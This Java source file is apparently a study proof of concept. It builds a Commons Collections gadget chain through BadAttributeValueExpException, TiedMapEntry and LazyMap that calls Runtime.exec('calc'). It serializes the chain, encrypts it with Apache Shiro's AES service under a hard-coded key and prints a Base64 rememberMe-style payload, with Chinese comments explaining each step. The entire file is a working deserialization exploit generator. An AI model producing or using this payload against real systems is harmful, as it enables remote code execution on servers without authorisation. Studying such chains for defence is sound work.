package cn.typesafe.jsv.serializable2;

import cn.typesafe.jsv.util.Serializer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exp5 {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[2]),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer transformerChain = ChainedTransformer.getInstance(transformers);

        // 在调用 get 方法时传入一个不存在的 key 时会调用 Transformer 的 transform 方法
        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
        // 在调用 toString 方法时会自动调用 getValue 方法并使用 构造方法传入的 key 当作 key
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        // 创建BadAttributeValueExpException对象，类型是 public 的，无需使用反射创建
        BadAttributeValueExpException obj = new BadAttributeValueExpException(null);
        // 成员 val 没有setVal 方法，只能通过反射修改
        Field valField = obj.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(obj, entry);

        /*-----------------------以下是序列化和反序列化测试----------------------------*/
        final byte[] bytes = Serializer.serialize(obj);

        byte[] key = Base64.getDecoder().decode("zSyK5Kp6PZAAjlT+eeNMlg==");

        // 创建一个 shiro 的 AES 加密服务类
        AesCipherService aesCipherService = new AesCipherService();
        // 使用 AES 加密序列化后的字节数组
        ByteSource encrypt = aesCipherService.encrypt(bytes, key);
        // 将加密后的字节数组转换使用 Base64 编码后输出
        String encoder = Base64.getEncoder().encodeToString(encrypt.getBytes());
        System.out.println("序列化后+AES加密+base64 encode：" + encoder);

        /*// 使用Base64 解码字符串为字节数组， 并使用AES 解密字节数组
        ByteSource decrypt = aesCipherService.decrypt(Base64.getDecoder().decode(encoder), key);
        // 反序列化为对象
        final Object o = Serializer.deserialize(decrypt.getBytes());
        System.out.println("反序列化+AES解密+base64 decode：" + o);*/
    }
}
